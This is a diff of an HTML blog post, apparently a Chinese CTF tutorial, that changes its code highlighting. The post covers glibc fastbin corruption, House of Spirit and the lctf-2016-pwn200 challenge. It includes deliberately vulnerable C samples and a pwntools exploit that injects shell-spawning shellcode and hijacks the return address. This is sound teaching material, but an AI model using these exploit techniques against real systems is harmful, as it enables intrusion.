@@ -294,7 +294,8 @@
     <!-- Custom Head -->
     
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
     
@@ -494,7 +495,31 @@
 <p>有新的fastbin加入fastbin list的时候,新来的fastbin的fd指针指向原来最靠外的fastbin,同时fastbin list指向新来的fastbin</p>
 <p>有malloc请求时候,最外边的一块(第一块),被取下,然后fastbin list会指向取下来这块的fd指向的那个地址,这个时候你的机会来了,你如果能在即将取走这块前改写他的fd,那么…怎么改写,,,一般是堆溢出</p>
 <p>现在基本清楚了,那个size字段指的大小不是data的大小,本块某一字段加上本块的size值就找到了下一块相应字段的地址,所以这个size是data加上头部的大小<br>同时这个size和fast binlist是对应的</p>
-<h2 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</div><div class="line">    <span class="keyword">void</span> *buf0, *buf1, *buf2;</div><div class="line"></div><div class="line">    buf0 = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line">    buf1 = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line"></div><div class="line">    <span class="built_in">free</span>(buf1);</div><div class="line">    <span class="built_in">free</span>(buf0);</div><div class="line"></div><div class="line">    buf0 = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line">    read(<span class="number">0</span>, buf0, <span class="number">64</span>);</div><div class="line">    buf1 = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line"></div><div class="line"></div><div class="line">    buf2 = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"buf2 is at %p\n"</span>, buf2);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">void</span> <span class="token operator">*</span>buf0<span class="token punctuation">,</span> <span class="token operator">*</span>buf1<span class="token punctuation">,</span> <span class="token operator">*</span>buf2<span class="token punctuation">;</span>
+
+    buf0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    buf1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">free</span><span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">free</span><span class="token punctuation">(</span>buf0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    buf0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf0<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    buf1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+    buf2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"buf2 is at %p\n"</span><span class="token punctuation">,</span> buf2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>来自上面提到的<a href="http://www.freebuf.com/news/88660.html" target="_blank" rel="external">blog</a></p>
 <p>malloc的顺序决定了<code>buf0</code>是地址比较小的那一块,所以<code>read</code>处对<code>buf0</code>的写能溢出改掉<code>buf1</code>的<code>fd</code></p>
 <p>而这个<code>free</code>的顺序能决定,大概是fastbin list链着的顺序<br>free掉buf0: list[x] -&gt; buf1<br>free掉buf1: list[x] -&gt; buf0 -&gt; buf1</p>
@@ -510,33 +535,156 @@
 <p>这个时候我们就可以对buf2所指向的地方写了,实现任意地址读写</p>
 <p>这个伪造的地址一般是bss段,要布置好<br><code>previous_size</code>[4字节] + <code>size</code>[4字节] + <code>fd</code>[4字节]<br>注意size值就行了</p>
 <h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>主要参考<a href="http://anquan.360.cn/learning/detail/3417.html" target="_blank" rel="external">这一篇</a>和上面的两篇<br>感觉大概是..emmmmmm~前面讲到的是在bss段上伪造堆,这个bss不属于随机化的一部分,程序运行前就能看到bss段基地址 <del>这个HOS的话,看起来是花式在栈上伪造一个堆</del></p>
-<p>原文的例子<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">void</span> *p = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</div><div class="line">    read(<span class="number">0</span>, buf, <span class="number">0x80</span>);</div><div class="line"></div><div class="line"></div><div class="line">    <span class="built_in">free</span>(p);</div><div class="line">    <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>原文的例子</p>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+    <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>我们要利用第一个read</p>
 <ol>
 <li>覆盖p变量,指向伪造的堆块</li>
-<li><p>伪造一个堆块..格式大概是</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">prev_size = <span class="number">0x00</span></div><div class="line">size = <span class="number">0x29</span> <span class="comment">//因为我们伪造的这个堆块大小也是32, 32 + 8 + 1 =&gt; 0x29</span></div><div class="line">fd = <span class="number">0x00</span></div></pre></td></tr></table></figure>
+<li>伪造一个堆块..格式大概是<pre class="line-numbers language-c"><code class="language-c">prev_size <span class="token operator">=</span> <span class="token number">0x00</span>
+size <span class="token operator">=</span> <span class="token number">0x29</span> <span class="token comment" spellcheck="true">//因为我们伪造的这个堆块大小也是32, 32 + 8 + 1 => 0x29</span>
+fd <span class="token operator">=</span> <span class="token number">0x00</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 </li>
-<li><p>因为free的时候还会对相邻的后一个chunk(是从地址上后一个,因为这个时候还是allocate的,所以和list无关)进行检查所以,要再伪造一个堆块,大小适中就可以了,inuse要是1??</p>
-</li>
+<li>因为free的时候还会对相邻的后一个chunk(是从地址上后一个,因为这个时候还是allocate的,所以和list无关)进行检查所以,要再伪造一个堆块,大小适中就可以了,inuse要是1??</li>
 </ol>
 <blockquote>
 <p>找打这个下一块应该是,emmmm,本块的size字段地址偏移本字段size的大小, 拿到下一块的大小,下一块的大小适中就可以了emmmmm</p>
 </blockquote>
 <p>之后free的时候,会把我们伪造堆块Free掉就会挂进到fastbinlistY里</p>
 <p>最后再malloc的时候就能获取到我们的伪造堆块了</p>
-<p>综上我们要有两个可控区域,如果在栈上的话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">+------------------+ 低地址</div><div class="line">chunk 1</div><div class="line">+------------------+</div><div class="line">想要控制的地址</div><div class="line">+------------------+</div><div class="line">chunk2</div><div class="line">+------------------+ 高地址</div></pre></td></tr></table></figure></p>
-<p>在栈上的话,肯定是先有了chunk2,然后有了chunk1,这个低地址的chunk1要能达到覆盖某个 <code>p = malloc(some_size)</code>的p的目的,然后这个chunk2用来绕过检查</p>
+<p>综上我们要有两个可控区域,如果在栈上的话</p>
+<pre><code>+------------------+ 低地址
+chunk 1
++------------------+
+想要控制的地址
++------------------+
+chunk2
++------------------+ 高地址
+</code></pre><p>在栈上的话,肯定是先有了chunk2,然后有了chunk1,这个低地址的chunk1要能达到覆盖某个 <code>p = malloc(some_size)</code>的p的目的,然后这个chunk2用来绕过检查</p>
 <h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><p>lctf-2016-pwn200</p>
-<p>这个题目按照我这边布置的结构大概是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">+--------------------+</div><div class="line">[8H]    RBP -------------&gt; 0x7fff ffff d9c0 (leak_addr)</div><div class="line">+--------------------+ --&gt; 0x7fff ffff d9a0</div><div class="line">[30H]  shellcode</div><div class="line">+--------------------+ -+&gt; 0x7fff ffff d970 (leak_addr - 50H) [*]shellcode_addr</div><div class="line">[20H]                   +</div><div class="line">+--------------------+ -+&gt; 0x7fff ffff d950</div><div class="line">[8H] ***ret_addr***     +</div><div class="line">+--------------------+  + =====&gt; 40H的User Data</div><div class="line">[8H] RBP                +</div><div class="line">+--------------------+  +</div><div class="line">[10H]                   +</div><div class="line">+--------------------+ -+&gt; 0x7fff ffff d830 (leak_addr - 90H) [*]fake_addr (User_data)</div><div class="line">[8H] size = 0x41</div><div class="line">+--------------------+</div><div class="line">[8H] prev_size</div><div class="line">+--------------------+</div><div class="line">[20H] padding</div><div class="line">+--------------------+</div></pre></td></tr></table></figure></p>
-<p>因为<code>print(&quot;%s&quot;)</code> 是遇到<code>\x00</code>得时候才认为字符串结束,所以我们如果输入给正好30H的数据(不含有<code>\x00</code>)的话,那那就泄露出上面最上面<code>EBP</code>的值<br>因为EBP大概是<code>0x0000 7fff ffff xxxx</code> 这样子的结构,所以从低到高会泄露出6个字节</p>
-<p>调试一下发现泄露出来的的EBP的值(leak_addr)和我们这个时候的EBP差20H…,<br>因为题目基本没有开任何防护,所以这里顺便铺设了shellcode,然后缓冲区是30H的大小<br>所以我们生成一个payload,然后高字节用padding够30H,发给题目<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">payload  = <span class="string">''</span></div><div class="line">payload += shellcode.ljust(<span class="number">48</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'who are u?\n'</span>)</div><div class="line">p.send(payload)</div><div class="line">p.recvuntil(payload)</div><div class="line"></div><div class="line">leak_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div></pre></td></tr></table></figure></p>
-<p>这个时候观察一下我们的shellcode距离当前RBP有30H, 当前RBP距离leak_addr有20H偏移<br>所以<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">shellcode_addr = leak_addr - <span class="number">50</span>H</div></pre></td></tr></table></figure></p>
-<p>后面有个功能输入id,可以伪造成第二个堆块的大小,这个id变量是放在leak_addr - 58H的地方,就是放在和我们shellcode相邻并且地址更小的那个地方,这个大小只要适当就好了,具体是在什么什么和什么什么之间来着忘记了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id = getid()</div></pre></td></tr></table></figure></p>
-<p>下一步是输入money,就是我们的核心,这里有一个溢出,我们要把malloc到的一个指针p覆盖成我们的fake_addr,然后还顺便构造好我们的fake_chunk的size,我们这里构造0x41,在之后我们会通过free把他拉进list里,最后malloc出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">+-----------+</div><div class="line">shellcode</div><div class="line">+-----------+ --+</div><div class="line">id (size)       +</div><div class="line">+-----------+   +</div><div class="line">padding         +</div><div class="line">+-----------+   +===&gt; fake_chunk&apos;s Size = 0x40</div><div class="line">RIP             +</div><div class="line">+-----------+   +</div><div class="line">RBP             +</div><div class="line">+-----------+   +</div><div class="line">padding         +</div><div class="line">+-----------+ --+--&gt; fake_addr</div><div class="line">size (0x41)</div><div class="line">+-----------+   </div><div class="line">prev_size</div><div class="line">+-----------+</div></pre></td></tr></table></figure></p>
-<p>大概就是这样子,<code>+</code>扩住的是我们最后要控制的地区,<code>fake_addr + 0x40 - 0x08</code>这个地址也就是id所在的地址被认为是下一块chunk,我们通过输入id,构造好了这里</p>
+<p>这个题目按照我这边布置的结构大概是</p>
+<pre><code>+--------------------+
+[8H]    RBP -------------&gt; 0x7fff ffff d9c0 (leak_addr)
++--------------------+ --&gt; 0x7fff ffff d9a0
+[30H]  shellcode
++--------------------+ -+&gt; 0x7fff ffff d970 (leak_addr - 50H) [*]shellcode_addr
+[20H]                   +
++--------------------+ -+&gt; 0x7fff ffff d950
+[8H] ***ret_addr***     +
++--------------------+  + =====&gt; 40H的User Data
+[8H] RBP                +
++--------------------+  +
+[10H]                   +
++--------------------+ -+&gt; 0x7fff ffff d830 (leak_addr - 90H) [*]fake_addr (User_data)
+[8H] size = 0x41
++--------------------+
+[8H] prev_size
++--------------------+
+[20H] padding
++--------------------+
+</code></pre><p>因为<code>print(&quot;%s&quot;)</code> 是遇到<code>\x00</code>得时候才认为字符串结束,所以我们如果输入给正好30H的数据(不含有<code>\x00</code>)的话,那那就泄露出上面最上面<code>EBP</code>的值<br>因为EBP大概是<code>0x0000 7fff ffff xxxx</code> 这样子的结构,所以从低到高会泄露出6个字节</p>
+<p>调试一下发现泄露出来的的EBP的值(leak_addr)和我们这个时候的EBP差20H…,<br>因为题目基本没有开任何防护,所以这里顺便铺设了shellcode,然后缓冲区是30H的大小<br>所以我们生成一个payload,然后高字节用padding够30H,发给题目</p>
+<pre class="line-numbers language-python"><code class="language-python">payload  <span class="token operator">=</span> <span class="token string">''</span>
+payload <span class="token operator">+=</span> shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'who are u?\n'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个时候观察一下我们的shellcode距离当前RBP有30H, 当前RBP距离leak_addr有20H偏移<br>所以</p>
+<pre class="line-numbers language-python"><code class="language-python">shellcode_addr <span class="token operator">=</span> leak_addr <span class="token operator">-</span> 50H
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>后面有个功能输入id,可以伪造成第二个堆块的大小,这个id变量是放在leak_addr - 58H的地方,就是放在和我们shellcode相邻并且地址更小的那个地方,这个大小只要适当就好了,具体是在什么什么和什么什么之间来着忘记了</p>
+<pre><code>id = getid()
+</code></pre><p>下一步是输入money,就是我们的核心,这里有一个溢出,我们要把malloc到的一个指针p覆盖成我们的fake_addr,然后还顺便构造好我们的fake_chunk的size,我们这里构造0x41,在之后我们会通过free把他拉进list里,最后malloc出来</p>
+<pre><code>+-----------+
+shellcode
++-----------+ --+
+id (size)       +
++-----------+   +
+padding         +
++-----------+   +===&gt; fake_chunk&#39;s Size = 0x40
+RIP             +
++-----------+   +
+RBP             +
++-----------+   +
+padding         +
++-----------+ --+--&gt; fake_addr
+size (0x41)
++-----------+   
+prev_size
++-----------+
+</code></pre><p>大概就是这样子,<code>+</code>扩住的是我们最后要控制的地区,<code>fake_addr + 0x40 - 0x08</code>这个地址也就是id所在的地址被认为是下一块chunk,我们通过输入id,构造好了这里</p>
 <p>等我们控制了这里之后,在写fake_chunk时候送一个<code>padding + shellcode_addr</code>,就能控制图中的RIP,达到了目的</p>
-<p>最后poc<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">7777</span>)</div><div class="line"><span class="comment"># p = process('./pwn200')</span></div><div class="line"></div><div class="line">free_got = <span class="number">0x0000000000602018</span></div><div class="line"></div><div class="line">shellcode = asm(shellcraft.amd64.linux.sh(), arch = <span class="string">'amd64'</span>)</div><div class="line"></div><div class="line">payload  = <span class="string">''</span></div><div class="line">payload += shellcode.ljust(<span class="number">48</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'who are u?\n'</span>)</div><div class="line">p.send(payload)</div><div class="line">p.recvuntil(payload)</div><div class="line"></div><div class="line">rbp_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"></div><div class="line">shellcode_addr = rbp_addr - <span class="number">0x50</span> <span class="comment"># 20H + 30H</span></div><div class="line"><span class="keyword">print</span> hex(shellcode_addr)</div><div class="line">fake_addr = rbp_addr - <span class="number">0x90</span> <span class="comment"># offset 0x40 to shellcode</span></div><div class="line"></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'give me your id ~~?\n'</span>)</div><div class="line">p.sendline(<span class="string">'32'</span>) <span class="comment"># id</span></div><div class="line">p.recvuntil(<span class="string">'give me money~\n'</span>)</div><div class="line"></div><div class="line"><span class="comment"># 32bytes padding + prev_size + size + padding + fake_addr</span></div><div class="line">data = p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>)</div><div class="line">data = data.ljust(<span class="number">56</span>, <span class="string">'\x00'</span>) + p64(fake_addr)</div><div class="line"><span class="keyword">print</span> data</div><div class="line">p.send(data)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'choice : '</span>)</div><div class="line">p.sendline(<span class="string">'2'</span>) <span class="comment"># free(fake_addr)</span></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'choice : '</span>)</div><div class="line">p.sendline(<span class="string">'1'</span>) <span class="comment">#malloc(fake_addr) #fake_addr</span></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'long?'</span>)</div><div class="line">p.sendline(<span class="string">'48'</span>)    <span class="comment"># 48 + 16 = 64 = 0x40</span></div><div class="line">p.recvline(<span class="string">'48'</span>)    <span class="comment"># ptr = malloc(48) </span></div><div class="line"></div><div class="line">data = <span class="string">'a'</span> * <span class="number">0x18</span> + p64(shellcode_addr) <span class="comment"># write to target_addr</span></div><div class="line">data = data.ljust(<span class="number">48</span>, <span class="string">'\x00'</span>)</div><div class="line"></div><div class="line">p.send(data)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'choice'</span>)</div><div class="line">p.sendline(<span class="string">'3'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p>最后poc</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">7777</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># p = process('./pwn200')</span>
+
+free_got <span class="token operator">=</span> <span class="token number">0x0000000000602018</span>
+
+shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span>
+
+payload  <span class="token operator">=</span> <span class="token string">''</span>
+payload <span class="token operator">+=</span> shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'who are u?\n'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+rbp_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+shellcode_addr <span class="token operator">=</span> rbp_addr <span class="token operator">-</span> <span class="token number">0x50</span> <span class="token comment" spellcheck="true"># 20H + 30H</span>
+<span class="token keyword">print</span> hex<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>
+fake_addr <span class="token operator">=</span> rbp_addr <span class="token operator">-</span> <span class="token number">0x90</span> <span class="token comment" spellcheck="true"># offset 0x40 to shellcode</span>
+
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'give me your id ~~?\n'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'32'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># id</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'give me money~\n'</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true"># 32bytes padding + prev_size + size + padding + fake_addr</span>
+data <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span>
+data <span class="token operator">=</span> data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_addr<span class="token punctuation">)</span>
+<span class="token keyword">print</span> data
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice : '</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># free(fake_addr)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice : '</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#malloc(fake_addr) #fake_addr</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'long?'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'48'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 48 + 16 = 64 = 0x40</span>
+p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token string">'48'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># ptr = malloc(48) </span>
+
